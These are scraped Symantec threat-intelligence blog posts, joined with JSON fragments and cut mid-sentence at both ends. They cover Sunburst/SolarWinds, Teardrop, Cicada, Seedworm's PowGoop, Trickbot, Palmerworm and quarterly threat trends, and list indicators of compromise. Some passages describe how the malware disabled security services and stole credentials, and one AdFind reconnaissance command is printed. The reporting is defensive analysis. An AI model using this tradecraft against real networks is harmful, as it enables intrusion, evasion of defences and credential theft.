full instructions to start the secondary HTTP communication channel. This may have been designed by the attackers as a feedback mechanism to ensure the DNS communication mechanism is working before sending the full HTTP communication channel details and, in the case of full details, a signal that the HTTP communication should have already started. After the timestamp, the security product status payload is optionally provided if select security product services were found as running. The two bytes contain a bitmask that encodes information on whether any of the following security products were not found, or found running and/or subsequently disabled and stopped: The userid, timestamp, feedback bit, and optional security product data are then encoded into text as the subdomain of a DNS query that is sent to the attackers. The responses to these DNS queries may then contain control information for the threat to terminate or launch a secondary HTTP communication channel, something that we plan to cover in a subsequent blog. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products.

    "text": "As we continue our analysis on the tools used inthe SolarWinds attacks, one of the most striking aspects we’ve noticed is how careful the attackers were to avoid drawing attention to themselves. Software supply chain attacks are relatively stealthy to begin with, since signed software from a trusted source is less likely to raise red flags. However, the attackers weren’t content to rely on the cover this provided and also took several other steps to avoid detection. To begin with, the Sunburst backdoor (Backdoor. Sunburst), which was delivered using a Trojanized update to SolarWinds Orion, sets a delay time of up to 14 days before execution. In other words, no malicious activity will begin until this period has elapsed. The length of time selected is most likely to increase the likelihood that the log entries of the initial malicious activity have been deleted before any subsequent post-breach activity is initiated, thereby making it difficult to correlate the two sets of malicious events. Many organizations, including even managed security services providers (MSSPs), will often purge their security logs after seven days to minimize storage costs and make searching them easier. Sunburst will also check the current Windows domain the machine belongs to. If the domain contains the string 'test' or one of 13 additional specific domains that appear related to lab systems such as “swdev.local” and “apac.lab”, the threat will cease to execute. A full list is in Appendix A. Attacks begin with a Trojanized version of SolarWinds’ Orion software. The attackers modified Orion in order to deliver the Sunburst backdoor to the computer. Sunburst is first stage malware, designed to perform reconnaissance on the infected computer, perform checks for security tools, and deliver a second stage payload, if required. The main Sunburst code is contained in a class named SolarWindows. Orion. Core. BusinessLayer that, when first instantiated, calls a member function called Update. The function name is a ruse, as the code does not perform any update, but instead is designed to disable security software, avoid security researcher systems, and possibly avoid running on systems not of interest to the attackers. The function contains three lists – a list of process names, a list of driver filenames, and a list of processes and service name pairs. These names are all obfuscated in the code by hashing them using the FNV1A algorithm and using variable names that masquerade as timestamps. This process and driver list contains tools that commonly run on security researcher systems and thus, this functionality appears to be designed not to run on such systems in order to avoid discovery. The full list of security tools can be found in Appendix A. Furthermore, the lists also contained names related to a variety of security software programs including: The security vendors on this list have most likely been chosen as the attacker has determined that their products are unlikely be installed at organizations of interest to the attackers. Given the indiscriminate nature of supply chain as a vector, with an estimated 18,000 SolarWinds customers affected, the attackers probably wanted to avoid any risk of detection in organizations that weren’t of interest to them. Interestingly, the process solarwindsdiagnostics is also blacklisted. Presumably this is included to avoid detection during any SolarWinds testing or troubleshooting. Sunburst also attempts to specifically disable some software security services via the registry. This allows Sunburst to perform its malicious actions completely undetected. If the attackers worked quickly and restored the services afterwards, a security administrator would potentially have no record of the activity, nor have even noticed the temporary lack of protection. Figure 1. Example of how Sunburst disables security software. In this case it checks if the CrowdStrike processes csfalconservice or csfalconcontainer are running, and if so, it sets the csagent, csfalconservice, and csdevicecontrol services to be disabled. To disable the security software, Sunburst will simply set the products’ service start setting to Disabled. In Windows, this is done by setting the registry keys: This will cause the security software not to load at the next reboot. It should be noted that the attackers do not attempt to disable any Symantec products. Presumably this is because of an anti-tampering feature in Symantec software, which prevents its own service from being disabled. The process and services pair list include software from the following vendors: Interestingly, the list also included Microsoft Defender, but only the service key permissions are changed. Currently, this has an unknown effect. In addition, some other unknown products are also included, but were effectively commented out. The attackers may have discovered this technique was ineffective for these products. Finally, Sunburst will check if api.solarwinds.com resolves to a valid address before continuing. The SolarWinds attacks are among the best-planned and adept attacks we have seen in recent years. The attackers have gone to great lengths to both find an effective path into their targeted organizations and, once inside their networks, maintain a low profile. Our analysis of these tools is ongoing and we plan to publish further blogs in the coming weeks. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products.

    "text": "We took a look through telemetry from our vast range of data sources and selected some of the trends that stood out from July, August, and September 2020 From significant increases in Emotet and Cobalt Strike activity to a spike in the number of server vulnerability exploit attempts, let’s take a quick look at the trends that shaped the cyber security threat landscape in the third quarter of 2020. Malware attacks have continued to increase quarter over quarter in 2020. In July, August, and September, Symantec, a division of Broadcom (NASDAQ: AVGO), blocked over 78 million malware infection attempts, which represents an almost 30% increase over Q2 and a 127% increase over the number blocked in Q1. The increase in activity may have been spurred by many countries exiting COVID-19 lockdowns, with a resurgence in business activity presenting more opportunities for cyber criminals. Malware that downloads files, which are often malicious, saw an increase in Q3. Symantec blocked 17% more of these threats in Q3 than in Q2. Attacks involving the use of the multipurpose commodity malware Cobalt Strike (Backdoor. Cobalt), have continued to increase. Detections of attacks involving the use of this threat increased 57% from August to September alone. The quarter on quarter trend is even more alarming, with a 163% increase seen when comparing Q1 2019 to Q3 2020. In many cases, Cobalt Strike is blocked by other detection technologies and signatures, meaning the true number of attacks involving this malware may be significantly higher. The Lokibot information-stealing malware (Infostealer. Lokibot) saw a 237% increase in activity from Q2 to Q3 2020. Lokibot is one of today’s most prevalent information-stealing threats and is often distributed via spam campaigns. Blocked Lokibot attacks in September reached the highest number seen since June 2019. As predicted towards the end of June, after over a year of subdued activity, the Emotet botnet (Trojan. Emotet), a known malware distribution platform, has returned in Q3. Following a dramatic drop in activity in Q2 2019 the malware looks to be steadily ramping up activity, with the number of blocked infection attempts in Q3 up 44% over that of Q1. The vast majority of Emotet infection attempts are blocked by email protection products, meaning antivirus detections are a small, representative sample of blocked Emotet activity. Looking at the numbers by month, there was a significant jump in activity from June to September, equating to a 353% increase. The vast majority of these blocked Emotet attacks occurred in the U. S. Symantec observed and blocked an Emotet spam campaign in September which was using COVID-19 themed lures. This campaign contributed to the surge in activity seen in September. For additional information on Emotet, read our blog: The Evolution of Emotet: From Banking Trojan to Threat Distributor Spam emails using COVID-19 themed lures have increased month-on-month in Q3, with a roughly 27% increase in the number of these emails blocked by Symantec each month. As mentioned, Symantec observed and blocked an Emotet spam campaign in September which was using COVID-19 themed lures. In Q3, the number of phishing attempts blocked by Symantec’s Intrusion Prevention System (IPS) technology increased 25% over the previous quarter, and almost doubled (97%) over numbers from Q1 2020. The number of server vulnerability exploit attempts blocked by Symantec IPS technology in Q3 increased by 77% over the previous quarter. This increase in exploit attempts follows a series of critical server vulnerability disclosures, such as the “Zerologon” flaw in Windows Server (CVE-2020-1472) and a vulnerability in Pulse Secure VPN servers (CVE-2019-11510). These types of vulnerabilities are tempting for hackers as they can offer access to enterprise servers and all the sensitive data stored there. Servers are also an ideal platform for launching further attacks. The average number of attacks against Symantec Internet of Things (IoT) honeypots* per day was down 8% in Q3 compared to Q2 2020. *Symantec IoT honeypots emulate protocols used by virtually all IoT devices, such as routers, connected cameras, digital video recorders, and so on. While the number of attacks decreased, the number of unique IP addresses performing IoT attacks increased in Q3, up 18% over the previous quarter. This suggests that the botnets carrying out the attacks are increasing in size. The top ten user names and passwords used in attacks on IoT devices. Most of the credentials used by attackers are default or easily guessable. The largest number of attacks originated from IP addresses located in the U. S. with 25% of attacks emanating from here. However, the number of attacks originating in the U. S. decreased in Q3, down from 34% the previous quarter. The second highest number of attacks originated in Vietnam, followed by China, India, and Taiwan. Since attacks are carried out by botnets of infected IoT devices, these regions have the highest number of infected IoT devices.

Thousands of organizations have been affected by a supply chain attack that compromised the update mechanism for SolarWinds Orion software in order to deliver a backdoor Trojan known as Sunburst (Backdoor. Sunburst) (aka Solorigate). Details on the attacks were disclosed yesterday(December 13) by the security firm FireEye. SolarWinds has alsopublished a security advisory for its customers. The campaign has been underway since at least March 2020. Any Orion user who downloaded an update in this period is likely to have been infected with Sunburst. According to FireEye, the attackers conducted further malicious activity on a subset of victim organizations that were of interest to them. By their nature, supply chain attacks are indiscriminate and will infect any user of the compromised software. They are carried out in order to provide the attacker with access to a large number of organizations, a subset of which will be identified as targets of interest for further compromise. The Trojanized software was signed by a certificate marked as being issued by Symantec. Symantec sold its certificate authority business to Digicert in 2018. The certificate in question was a legacy certificate still using the Symantec brand name. Symantec has contacted Digicert, which has confirmed that it is investigating the issue. Symantec has identified more than 2,000 computers at over 100 customers that received Trojanized software updates. We have found a small number of organizations where a second stage payload (Backdoor. Teardrop) was used. An existing SolarWinds DLL called SolarWinds. Orion. Core. BusinessLayer.dll was modified by the attackers to include an added class. The malware is designed to remain inactive for a period after installation. It will then attempt to resolve a subdomain of avsvmcloud[.]com. The DNS response will deliver a CNAME record that directs to a command and control (C&C) domain. In SolarWinds. Orion. Core. BusinessLayer. BackgroundInventory. InventoryManager. RefreshInterval() code is added to call OrionImprovementBusinessLayer. Initialize(). OrionImprovementBusinessLayer is a malicious class added by the attacker. It has the following functionality: A second stage payload, a backdoor called Teardrop, is deployed against a targets of interest to the attackers. Symantec has observed two variants of Teardrop, both of which behave similarly and are used to deliver a further payload – the Cobalt Strike commodity malware. The first variant (SHA256: b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07) is a DLL. The malicious code is contained in the export Tk_CreateImageType, ordinal 209. When executed, that malicious code reads a file named upbeat_anxiety.jpg from the current directory and ensures it has a jpg header. It will also check that the registry key HKCU\\Software\\Microsoft\\CTF exists. An embedded copy of Cobalt Strike is then extracted and executed. That CobaltStrike sample connects to infinitysoftwares[.]com for command and control. The second variant (SHA256:1817a5bf9c01035bcf8a975c9f1d94b0ce7f6a200339485d8f93859f8f6d730c) is similar, except that the file it loads is called festive_computer.jpg. The embedded CobaltStrike payload connects to ervsystem[.]com for command and control. The post-compromise attack chain for one computer investigated saw the initial Sunburst malware, a modified solarwinds.orion.core.businesslayer.dll, installed through the Orion update process on the victim computer on the 7th of the month. On the 28th of the month, 21 days later, the legitimate executable solarwinds.businesslayerhost.exe, which loads the malicious DLL, created a copy of Teardrop in a file called cbsys.dll, in the c:\\windows\\panther folder. This filename and path appear to be unusual since most instances of Teardrop were created in a file called netsetupsvc.dll in the c:\\windows\\syswow64 folder, as documented by FireEye. The Backdoor. Teardrop sample is a DLL with malicious code contained in the export Tk_CreateImageType. When executed, that export reads a file named upbeat_anxiety.jpg from the current directory and ensures it has a jpg header. It will also check that the registry key HKCU\\Software\\Microsoft\\CTF exists. An embedded copy of Cobalt Strike is then extracted. That CobaltStrike samples connects a C&C server - infinitysoftwares[.]com. At this point, the attackers launch WMI to execute rundll32.exe to load another malicious DLL called resources.dll in the path csidl_windows\\desktoptileresources\\. Resources.dll attempts to obtain credentials by accessing lsass.exe using similar techniques to Mimikatz, a widely used credential dumping tool. Adfind, a tool that is able to query Active Directory, is then introduced to the system as searchindex.exe and then executed (cmd.exe /c SearchIndex.exe -sc u:<removed> > .\\h.txt). Results are saved in the file h.txt. Using this information, the attackers are attempting to gain elevated privileges (e.g. domain administrator) to access the domain or laterally traverse the environment. Orion users should update to Orion Platform version 2020.2.1 HF 2. Orion users should check their networks for indications of post-compromise activity, including: It should be borne in mind that although there may be some commonalities in post-compromise activity, each victim is likely to see different patterns in activity. That activity is likely to involve heavy use of living-off-the-land techniques to minimize the likelihood of being detected, something the attackers seem to be prioritizing based on how they conducted the first stages of the attack. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products.

    "text": "A large-scale attack campaign is targeting multiple Japanese companies, including subsidiaries located in as many as 17 regions around the globe in a likely intelligence-gathering operation. Companies in multiple sectors are targeted in this campaign, including those operating in the automotive, pharmaceutical, and engineering sector, as well as managed service providers (MSPs). The scale and sophistication of this attack campaign indicates that it is the work of a large and well-resourced group, with Symantec, a division of Broadcom (NASDAQ: AVGO), discovering enough evidence to attribute it toCicada (aka APT10, Stone Panda, Cloud Hopper). Cicada has been involved in espionage-type operations since 2009, andU. S. government officials have linked the activities of APT10, which we track as Cicada, to the Chinese government. Cicada has historically been known to target Japan-linked organizations, and has also targeted MSPs in the past. The group is using living-off-the-land tools as well as custom malware in this attack campaign, including a custom malware - Backdoor. Hartip - that Symantec has not seen being used by the group before. Among the machines compromised during this attack campaign were domain controllers and file servers, and there was evidence of files being exfiltrated from some of the compromised machines. The attackers extensively use DLL side-loading in this campaign, and were also seen leveraging the ZeroLogon vulnerability that was patched in August 2020. This campaign was first discovered by Symantec when suspicious DLL side-loading activity on one of our customer’s networks triggered an alert in ourCloud Analyticstechnology, which is available in Symantec Endpoint Security Complete (SESC). This activity was then reviewed by our Threat Hunter analysts before being passed on to our investigations team for further analysis. Cloud Analytics leverages artificial intelligence in order to comb through Symantec’s vast data and spot patterns associated with targeted attacks. It is capable of automatically flagging incidents that would otherwise have taken thousands of hours of analyst time to identify. The initial Cloud Analytics alert allowed our threat hunting team to identify further victims of this activity, build a more complete picture of this campaign, and attribute this activity to Cicada. It also allowed us to update and create new protections to ensure our customers are protected from this activity. This campaign has been ongoing since at least mid-October 2019, right up to the beginning of October 2020, with the attack group active on the networks of some of its victims for close to a year. The campaign is very wide-ranging, with victims in a large number of regions worldwide. The companies hit are, in the main, large, well-known organizations, many of which have links to Japan or Japanese companies, which is one of the main factors tying the victims together. Cicada has been known to have a strong focus on Japanese organizations in previous attack campaigns. As is clear from the map inFigure 1, South and East Asia are strong areas of focus for the attackers in this campaign. It is unusual to see a reportedly Chinese-government-linked group attacking companies within China’s borders but, like many of the companies targeted in this campaign, the target in that instance is a subsidiary of a Japanese organization. We also saw similar loaders on all the victim networks. These are among the main factors linking these victims together, with all of them coming from a wide variety of sectors, including: The amount of time the attackers spent on the networks of victims varied, with the attackers spending a significant amount of time on the networks of some victims, while spending just days on other victim networks. In some cases, too, the attackers spent some time on a network but then the activity would cease, but start again some months later. We observed the attackers using a wide variety of living-off-the-land, dual-use, and publicly available tools and techniques in these attacks, including: The threat actors also use a legitimate cloud file-hosting service for exfiltration. The attackers also useDLL side-loadingat multiple stages during the attack, including using it to load Backdoor. Hartip. DLL side-loading occurs when attackers are able to replace a legitimate library with a malicious one, allowing them to load malware into legitimate processes. Attackers use DLL side-loading to try and hide their activity by making it look legitimate, and it also helps them avoid detection by security software. It is a tactic that is commonly used by APT groups and has often been observed being used by nation-state backed actors. Monitoring networks for unusual activity, as Symantec’s Cloud Analytics technology does, is key for detecting this kind of malicious activity. The attackers were also seen deploying a tool capable of exploiting the ZeroLogon vulnerability (CVE-2020-1472). The critical elevation-of-privilege vulnerability was first disclosed and patched on August 11, 2020, and can allow attackers to spoof a domain controller account and then potentially use it to steal domain credentials, take over the domain, and completely compromise all Active Directory identity services. It has been exploited by multiple malicious actors since its disclosure, leading both Microsoft and the Department of Homeland Security’s (DHS) Cybersecurity and Infrastructure Security Agency (CISA) to issue warnings to Windows users to patch the issue as quickly as possible. The scale and sophistication of this attack campaign indicate that it is the work of a large and well-resourced group, such as a nation-state actor, with Symantec discovering enough evidence to attribute it with medium confidence to Cicada. Symantec analysts have linked this activity to Cicada due to the use of previously seen obfuscation techniques and shellcode on loader DLLs. Activity seen in one of the victim organizations has various trait similarities with previously seen Cicada activity that was describedin a blog by Cylance in 2019, including: In another affected organization, the loaders deploying Backdoor. Hartip overlap in the obfuscation and shellcode used, making us confident it is the same actor in both organizations. Similarities between activity in both organizations These similarities leave us confident that this is the same group carrying out this activity in both organizations, and that this group is Cicada. Historically, Cicada has been seen using custom DLL loaders to decrypt and execute its final payload, as is observed in these attacks. We also saw similar loaders as those used in these two organizations used on other victim networks. The scale of the operations also points to a group of Cicada’s size and capabilities. The targeting of multiple large organizations in different geographies at the same time would require a lot of resources and skills that are generally only seen in nation-state backed groups. The link all the victims have to Japan also points towards Cicada, which has been known to target Japanese organizations in the past. The targeting of MSPs is also a hallmark of Cicada’s activity. Successfully compromising an MSP can give attackers high-level access to multiple companies without them having to compromise the individual companies’ networks. We have also seen Cicada utilizing some of the same publicly available tools – such as WMIExec – in the past. The attackers also take various steps to reduce the chances of their activity being spotted – including searching for security software on victim machines using WMIC, and using PowerShell to clear event logs to hide their activity once they are finished on victim machines. This kind of activity is the hallmark of sophisticated and experienced threat actors. All of these facts point to Cicada being the perpetrator of these wide-ranging and sophisticated attacks. Intelligence gathering and stealing information has generally been the motivation behind Cicada’s attacks in the past, and that would appear to be the case in this attack campaign too. We observed the attackers archiving some folders of interest in these attacks, including in one organization folders relating to human resources (HR), audit and expense data, and meeting memos. Japan-linked organizations need to be on alert as it is clear they are a key target of this sophisticated and well-resourced group, with the automotive industry seemingly a key target in this attack campaign. However, with the wide range of industries targeted by these attacks, Japanese organizations in all sectors need to be aware that they are at risk of this kind of activity. Cicada clearly still has access to a lot of resources and skills to allow it to carry out a sophisticated and wide-ranging campaign like this, so the group remains highly dangerous. Its use of a tool to exploit the recently disclosed ZeroLogon vulnerability and a custom backdoor that has not been observed by Symantec before show that it continues to evolve its tools and tactics to actively target its victims. The group’s use of techniques such as DLL side-loading and a wide array of living-off-the-land tools underline the need for organizations to have a comprehensive security solution in place to detect this kind of suspicious activity before actors like Cicada have the chance to deploy malware or steal information from their networks. This activity was first discovered thanks to an alert triggered by ourCloud Analyticstechnology, which is available in Symantec Endpoint Security Complete (SESC). 8b6ad87e408e38fc1db868da6e643f616dac59fbae08382c4a7dd4ea119ea057d5e38ac1187c607e701f506c4015bde94be6c485d566d004d810d7565c18874326460aa2df29f766cb5712ebca44cb3365ebfdb5cae0b2ec36ef1e3568911d6acdec58a57381bb8c1e374efb0bf1897d89d1e096d2b704820893859d9f08d086ea9d994de91389280b334f2af991baa49ca613a6bf898d7bb25f88cc66488f5c3f5b623222c755d59052fab9e096c9d2b9a47d06b3a5de62fb9a66750af4efc427873e3d4ec3a0e7d66bee8bda4d65cc8fcefbdca2c8d5c049372a63ff0bc2edcf3ae16b01f7eb129e0e7387ac7feb61ecfce5db0d7494b3962c02c681f504d4578ea26729b43fd976365a6700c80950e0b71a39e67bfff715423d60ae6bfab903ab1588acaabdb509e9db7cfe1e60522bc8baa13bbd35160b4bde7d1b6402ef4a08eb0eb1f4ebb54bceabbebcb7da48238f0278ae5421326ee65ec7951e4239 178.73.210.238188.119.112.225213.252.246.24545.14.224.9345.67.230.13481.7.7.15995.179.143.32 The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

In the course of protecting enterprise endpoints, Symantec, a division of Broadcom (NASDAQ: AVGO), has turned up evidence of an increasingly prevalent scam tactic in the run-up to the U. S. presidential election: SMS phishing attempts using bait with campaign, voting, and political themes. Symantec Endpoint Protection Mobile(SEP Mobile) shields users from SMS phishing attempts by checking URLs found in text messages against the threat intelligence inSymantec WebPulse, part of the Symantec Global Intelligence Network (GIN), and alerting users when the links are suspect. We took a look at the links contained in SMS messages sent to mobile devices located in the United States between the first week in August and late October 2020 and found a sharp increase during that period in the percentage of election-themed messages containing phishing URLs. Over the last three months, we observed the number of election-associated text messages containing links to websites double. Of these messages, we saw the number bringing the user to a scam/phishing/or attack-associated website increase from 1 in 5 (18.3%) to almost half (48.6%). These attacks have been observed in all regions of the United States, and target the full range of the political spectrum. SMS phishing presents a risk to all smartphone users.

    "text": "The Iran-linked espionage group Seedworm (aka MuddyWater) has been highly active in recent months, attacking a wide range of targets, including a large number of government organizations in the Middle East. Many of the organizations attacked by Seedworm in recent months have also been targeted by a recently discovered tool called PowGoop (Downloader. Covic), suggesting that it is a tool that Seedworm has incorporated into its arsenal. However, at present Symantec, a division of Broadcom (NASDAQ: AVGO), can only make a medium-confidence link between Seedworm and PowGoop. The recent wave of Seedworm attacks were uncovered by Symantec’s Targeted Attack Cloud Analytics, which leverages advanced machine learning to spot patterns of activity associated with targeted attacks. The activity was reviewed by Symantec’s Threat Hunter team (part ofSymantec’s Endpoint Security Completeoffering) which linked it to previous Seedworm activity. Among the things flagged by Cloud Analytics was a registry key called “SecurityHealthCore\". The code residing in this registry key is executed by PowerShell from a scheduled task. In all of the organizations where this registry key was found, a known Seedworm backdoor (Backdoor. Mori) was subsequently detected. Attacks were uncovered against targets in Iraq, Turkey, Kuwait, the United Arab Emirates, and Georgia. In addition to some government entities, organizations in the telecoms and computer services sector were also targeted. In one such victim, a sample of Backdoor. Mori was dropped and installed as early as December 2019 on a SQL server. Seedworm activity continued until at least July 2020, with the installation of additional hacking tools by the attackers. During this time, Symantec observed Seedworm performing credential-stealing activities as well as setting up tunnels to its own infrastructure to assist with lateral movement using an open-source tools known asSecure Sockets Funneling(SSF) andChisel. Seedworm is known to have leveraged Chisel in the past. Credential dumping was done by dumping the contents of the Windows Registry to files in the same directories as Seedworm backdoors. Additionally, Seedworm was also observed using Quarks password dumper (Quarks PwDump) to steal local account password hashes. Seedworm was also observed setting up tunnels to its own infrastructure using Secure Sockets Funneling and Chisel. These tools allow the attackers to configure local and remote port forwarding as well as copying files to compromised machines. On the same machine where Seedworm was active, a tool known as PowGoop was deployed. This same tool was also deployed against several of the organizations attacked by Seedworm in recent months; however, at present Symantec can only establish a medium-confidence link between PowGoop and Seedworm. PowGoop, which was first publicly reported on in July 2020, is a loader DLL. It likely arrives in a ZIP file named ‘google.zip’ containing the loader itself and legitimate Google binaries used for side-loading it. In the same organization as mentioned previously, Symantec observed Seedworm activity which was followed by PowGoop activity just six days later. In the majority of recent infections, PowGoop appears to have been deployed via a remote execution tool known asRemadmin. This tool is used to execute PowerShell to read and decode the contents of a file which is used to execute the contents in memory. It appears this code is used to load PowGoop’s main DLL (goopdate.dll) via rundll32.exe. A feature of these files is that they have distinctive variable and function naming that resembles human names concatenated together. We have no reason to believe that these are actual people’s names. On several of the victim machines, a ZIP file called ‘google.zip’ was also found present in the same directory. How the ZIP file arrives on the victim’s computer remains unknown. The ZIP contains a mix of legitimate Google executables and malicious DLL files. A legitimate ‘googleupdate.exe’ file is used to side load PowGoop via rundll32.exe. PowGoop loaders are used to decode and execute the contents of a file called ‘config.txt’. All config.txt files found to date contained PowerShell scripts that download and execute more PowerShell code. In some cases, PowGoop is used to launch ‘Wscript.exe’ to execute an unknown VBS file called ‘v.txt’. Similarly, Symantec also observed legitimate tools (openssl.exe) and a downloader tool (ssleay32.dll) present in the same directories used to download additional tools: Similar download requests were also observed via PowerShell: During PowGoop activity, Symantec also observed the attackers using the Secure Sockets Funneling tool as well as Chisel suggesting a link between the two sets of activity. In several recent Seedworm attacks, PowGoop was used on computers that were also infected with known Seedworm malware (Backdoor. Mori). In addition to this, activity involving Seedworm’s Powerstats (aka Powermud) backdoor appears to have been superseded by DLL side-loading of PowGoop. Additionally, during PowGoop activity, we also observed the attackers downloading tools and some unknown content from GitHub repos, similar towhat has been reported on Seedworm‘s Powerstats in the past. These patterns of activity beg the question as to whether PowGoop is actually an evolution of Powerstats rather than a completely new tool. To date, there is insufficient evidence to confirm this hypothesis. However, there are several similarities between the tools: While none of this is sufficient to confirm that PowGoop has evolved from Powerstats, Symantec continues to monitor the activity of Seedworm for any additional evidence. PowGoop has, in recent weeks, been loosely linked to a variant of ransomware known as Thanos. Thanos is an aggressive form of ransomware which, in addition to encryption, will also attempt to overwrite the master boot record (MBR) of the infected computer. Our peers at Palo Alto Networks reportedthat PowGoop was found at a Middle Eastern state-run organization which was also hit by Thanos. This lead to the suspicion that the Thanos attackers were using PowGoop in their attacks; however, Palo Alto could not confirm the connection. Symantec has not found any evidence of a wiper or ransomware on computers infected with PowGoop. This suggests that either the simultaneous presence of PowGoop and Thanos in one attack was a coincidence or, if the two are linked, that PowGoop is not used exclusively to deliver Thanos. Symantec uncovered attacks involving PowGoop against organizations in Iraq, Afghanistan, Israel, Turkey, Azerbaijan, Georgia, Cambodia, and Vietnam. Sectors targeted included governments, technology, telecoms, oil and gas, real estate, and education. Seedworm has been one of the most active Iran-linked groups in recent months, mounting apparent intelligence-gathering operations across the Middle East. While the connection between PowGoop and Seedworm remains tentative, it may suggest some retooling on Seedworm’s part. Any organizations who do find evidence of PowGoop on their networks should exercise extreme caution and perform a thorough investigation.

S. lawsuit filed by Microsoftand the Financial Services Information Sharing and Analysis Center (FS-ISAC) against Trickbot’s anonymous operators and was based on technical evidence provided by the Symantec, a division of Broadcom (NASDAQ: AVGO) Threat Hunter Team and others. The legal action marked the culmination of a years-long, cross-industry collaboration to find innovative ways to thwart a pernicious botnet that has fueled numerous cyber-crime sprees. Inwritten testimony provided to the court, Symantec technical director Vikram Thakur said Trickbot has spread prolifically across the internet for years and become one of the most commonly blocked types of malware, suggesting it is now one of the world’s largest botnets. Thakur described the serious harm caused to users whose computers are infected with Trickbot and whose banking credentials and other sensitive information are frequently stolen by the attackers. He also described its impact on financial institutions, which have borne significant losses due to Trickbot fraud. In recent times, Trickbot has been implicated in targeted ransomware attacks, where credentials stolen by the malware were used by the Ryuk ransomware operators to compromise victims’ networks and encrypt all accessible computers. This assessment has beenconfirmed by Europol, which recently noted that “the relationship between Emotet [another botnet], Ryuk and Trickbot is considered one of the most notable in the cybercrime world”. The botnet’s impact on banks and other financial sector organizations prompted a successful and close collaboration between the security industry and the financial sector, represented by FS-ISAC. Unlike prior legal “takedown” actions against botnets, this case did not involve seizure of malicious infrastructure or redirection of network traffic but instead relied upon intellectual-property laws to effectively evict the botnet operators from the command-and-control servers they need to maintain access to victim machines. Trickbot is a major botnet consisting of computers that have been infected with the Trickbot Trojan (Trojan. Trickybot). The Trojan is modular in nature, meaning it can easily be customized with one or more of an array of custom components designed to carry out a range of malicious activities on infected computers. To date, it has mainly been used for two main purposes: stealing credentials from infected computers and acting as a distribution channel for other malware. Symantec believes that Trickbot’s operators earn most of their revenue from selling stolen credentials on the cyber underground and leasing out the botnet as a distribution channel for other malware authors. Trickbot is spread through spam and phishing email campaigns which usually bear a Microsoft Word attachment containing malicious macros. If the document is opened by the unsuspecting user, Trickbot will be installed on the victim’s computer. In some cases, other malware, particularly ransomware, is also installed on the victim’s computer. Trickbot will also attempt to leverage known software vulnerabilities to move across the victim’s network and install itself on other computers. Trickbot is modular malware, capable of performing a range of different malicious activities. The first module to be installed on the victim’s computer is the loader, which contains an encrypted list of IP addresses from which it can download its main module. Once downloaded, the main module will check the architecture of the victim computer and save this along with the bot’s own information. The main component then prepares a framework for additional modules and initiates a connection to one of a pre-configured list of command and control (C&C) servers. The main module downloads one or more additional modules. Known modules include: Trickbot includes a number of features designed to minimize the risk of detection by security software. For example, the main module is designed to evade execution within “sandboxes,” which are controlled environments used by security companies to analyze malware. This module will also check the current user’s privileges and, if they have low privileges, it will elevate them using User Access Control (UAC) bypass, a technique that allows execution of programs with elevated privileges without the user being prompted. When it obtains elevated privileges, Trickbot will attempt to identify any security software that is installed on the computer and attempt to stop it and end any related services. One of the main threats for Trickbot victims is credential theft. This is carried out by a module that monitors for browser visits to a pre-configured list of banking websites. If the user visits any of these websites, the module intercepts and alters network traffic between the computer and the website, allowing the attackers to steal the victim’s banking credentials after they are input by the user. Trickbot will also attempt to steal other credentials from Chrome and Internet Explorer’s password storage features, from various RDP and SSH related services, and from other password managers. While infected computers are added to the Trickbot botnet, they yield the most value to attackers immediately after infection. Other malware families are usually delivered at the point of initial infection. Credential theft happens immediately after infection, while banking credentials are stolen the first time the victim attempts to log into their bank. Even if the malware is subsequently detected and the computer is removed from the botnet, much of the damage will have been done at this point, with stolen credentials exfiltrated by the attackers and likely sold to other cyber criminals. By pooling resources and intelligence and utilizing available legal avenues, the information security and financial sectors hope to strike a major blow against Trickbot. Symantec is grateful for the leadership of Microsoft and FS-ISAC and the support of ESET, NTT, and Lumen Technologies. This latest action, however, is just one step in an ongoing campaign. Complete eradication of this botnet will likely require additional actions from government partners in multiple jurisdictions. However, this action proves that successful private industry collaboration can be effective in countering cyber-crime and we hope that this set a new precedent for further initiatives. The following protections are in place to protect customers against Trickbot activity: Symantec recommends users observe the following best practices to protect against Trickbot attacks: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

    "text": "The Threat Hunter Team at Symantec, a division of Broadcom (NASDAQ: AVGO), has uncovered a new espionage campaign carried out by the Palmerworm group (aka BlackTech) involving a brand new suite of custom malware, targeting organizations in Japan, Taiwan, the U. S., and China. The attacks occurred in 2019 and continued into 2020, targeting organizations in the media, construction, engineering, electronics, and finance sectors. We observed the group using previously unseen malware in these attacks. Palmerworm uses a combination of custom malware, dual use tools, and living-off-the-land tactics in this campaign. Palmerworm has been active since at least 2013, with the first activity seen in this campaign in August 2019. Palmerworm was observed using both dual-use tools and custom malware in these attacks. Among the custom malware families we saw it use were: We have not observed the group using these malware families in previous attacks – they may be newly developed tools, or the evolution of older Palmerworm tools. Malware used by Palmerworm in the past has included: While the custom malware used by the group in this campaign is previously undocumented, other elements of the attack bear similarities to past Palmerworm campaigns, making us reasonably confident that it is the same group carrying out this campaign. As well as the four backdoors mentioned, we also see the group using a custom loader and a network reconnaissance tool, which Symantec detects as Trojan Horse and Hacktool. The group also used several dual-use tools, including: All these dual-use tools are commonly exploited by malicious actors like Palmerworm, with advanced persistent threat (APT) groups like this increasingly using living-off-the-land tactics, including the use of dual-use tools, in recent years. These tools provide attackers with a good degree of access to victim systems without the need to create complicated custom malware that can more easily be linked back to a specific group. In this campaign, Palmerworm is also using stolen code-signing certificates to sign its payloads, which makes the payloads appear more legitimate and therefore more difficult for security software to detect. Palmerworm has beenpublicly documentedusing stolen code-signing certificates in previous attack campaigns. We did not see what infection vector Palmerworm used to gain initial access to victim networks in this campaign, however, in the past the group has beendocumented as using spear-phishing emailsto gain access to victim networks. Symantec identified multiple victims in this campaign, in a number of industries, including media, construction, engineering, electronics, and finance. The media, electronics, and finance companies were all based in Taiwan, the engineering company was based in Japan, and the construction company in China. It is evident Palmerworm has a strong interest in companies in this region of East Asia. We also observed Palmerworm activity on some victims in the U. S., however, we were unable to identify the sector of the companies targeted. Palmerworm activity was first spotted in this campaign in August 2019, when activity was seen on the network of a Taiwanese media company and a construction company in China. The group remained active on the network of the 